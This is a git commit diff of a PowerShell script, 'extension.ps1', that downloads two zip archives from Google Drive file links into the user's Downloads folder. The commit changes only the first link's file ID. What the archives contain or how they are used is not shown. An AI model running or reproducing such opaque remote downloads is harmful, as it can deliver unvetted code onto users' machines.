e574a022c0b0e5d5568a0641066226656496d86f
haxor112233 <runaa1000@gmail.com>
2025-08-16 21:44:55 +0600

    Update extension.ps1

--- extension.ps1
+++ extension.ps1
@@ -5,7 +5,7 @@
 $folderPath = "$env:USERPROFILE\Downloads"
 
 # Downloading the first file
-curl -o "$folderPath\1.zip" "https://drive.usercontent.google.com/download?id=1vHILX3DIuatPc7ewvDuVjUY2OY5wRk11&export=download"
+curl -o "$folderPath\1.zip" "https://drive.usercontent.google.com/download?id=16v8fXTl_g3u9PbA3MlIUCMCjevUrwgyy&export=download"
 
 # Downloading the second file
 curl -o "$folderPath\2.zip" "https://drive.usercontent.google.com/u/0/uc?id=19tqerOt_5WZVvSWZ9xjj-HAVAm6AbPfi&export=download"
